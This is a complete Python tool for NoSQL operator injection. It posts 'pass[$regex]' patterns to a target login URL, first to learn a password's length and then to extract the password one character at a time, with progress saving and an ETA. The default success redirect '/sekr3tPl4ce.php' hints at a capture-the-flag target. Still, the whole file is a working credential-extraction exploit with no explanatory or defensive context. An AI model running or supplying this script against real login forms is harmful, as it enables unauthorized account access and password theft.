#!/usr/bin/env python3
import requests
import time
import argparse
import string
import re
import sys
import os
from datetime import timedelta

# Use fixed charset: letters, digits, and punctuation
CHARSET = string.ascii_letters + string.digits + string.punctuation
PROGRESS_FILE = "nosql_brute.progress"

def detect_length(url, username, delay, success_location):
    sess = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; nosql-brute/clean)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url
    }
    print("[*] Detecting password length...")
    for length in range(1, 51):  # Try up to length 50
        pattern = "^" + "." * length + "$"
        data = {
            "user": username,
            "pass[$regex]": pattern,
            "remember": "on"
        }
        resp = sess.post(url, data=data, headers=headers, allow_redirects=False, timeout=10)
        if resp.status_code == 302 and resp.headers.get("Location") == success_location:
            print(f"[+] Password length detected: {length}")
            return length
        time.sleep(delay)
    print("[-] Could not detect password length")
    return None

def save_progress(prefix):
    with open(PROGRESS_FILE, "w") as f:
        f.write(prefix)

def load_progress():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r") as f:
            return f.read().strip()
    return ""

def find_password(url, username, pw_length, delay, success_location, resume):
    sess = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; nosql-brute/clean)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url
    }

    found = load_progress() if resume else ""
    if found:
        print(f"[*] Resuming from saved progress: '{found}'")

    for pos in range(len(found), pw_length):
        print(f"[+] Finding character {pos+1}/{pw_length} (current prefix: '{found}')")
        start_time = time.time()
        remaining = pw_length - pos - 1
        char_found = None

        for c in CHARSET:
            c_escaped = re.escape(c)
            pattern = "^" + re.escape(found) + c_escaped + ("." * remaining) + "$"

            data = {
                "user": username,
                "pass[$regex]": pattern,
                "remember": "on"
            }

            try:
                resp = sess.post(url, data=data, headers=headers, allow_redirects=False, timeout=10)
            except requests.RequestException as e:
                print(f"[-] Request error: {e}")
                time.sleep(delay)
                continue

            if resp.status_code == 302 and resp.headers.get("Location") == success_location:
                char_found = c
                found += c
                save_progress(found)
                elapsed = time.time() - start_time
                eta_seconds = elapsed * (pw_length - pos - 1)
                eta = str(timedelta(seconds=int(eta_seconds)))
                print(f"[+] Found: '{c}' -> prefix now '{found}' | ETA: {eta}")
                break

            time.sleep(delay)

        if char_found is None:
            print(f"[-] No match for position {pos+1}")
            return None

    return found

def main():
    ap = argparse.ArgumentParser(description="Clean NoSQL regex brute forcer with resume, ETA, and length auto-detect.")
    ap.add_argument("--url", required=True, help="Target POST URL")
    ap.add_argument("--user", default="admin", help="Username")
    ap.add_argument("--delay", type=float, default=0.1, help="Delay between requests")
    ap.add_argument("--success-location", default="/sekr3tPl4ce.php", help="Location header on success")
    ap.add_argument("--resume", action="store_true", help="Resume from saved progress")
    ap.add_argument("--length", type=int, help="Password length (skip auto-detect if given)")
    args = ap.parse_args()

    if not args.length:
        length = detect_length(args.url, args.user, args.delay, args.success_location)
        if not length:
            sys.exit(1)
    else:
        length = args.length

    password = find_password(
        url=args.url,
        username=args.user,
        pw_length=length,
        delay=args.delay,
        success_location=args.success_location,
        resume=args.resume
    )

    if password:
        print(f"\n[+] Password discovered: {password}")
        if os.path.exists(PROGRESS_FILE):
            os.remove(PROGRESS_FILE)
    else:
        print("\n[-] Failed to discover password")

if __name__ == "__main__":
    main()
